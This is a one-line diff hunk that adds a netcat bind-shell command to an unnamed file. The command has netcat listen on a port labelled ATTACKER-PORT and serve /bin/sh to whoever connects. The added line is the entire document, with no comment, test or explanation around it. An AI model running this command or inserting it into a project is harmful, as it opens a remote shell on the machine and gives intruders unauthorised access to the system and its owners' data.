@@ -1,0 +1,1 @@
+/bin/nc -c /bin/sh -nlp ATTACKER-PORT
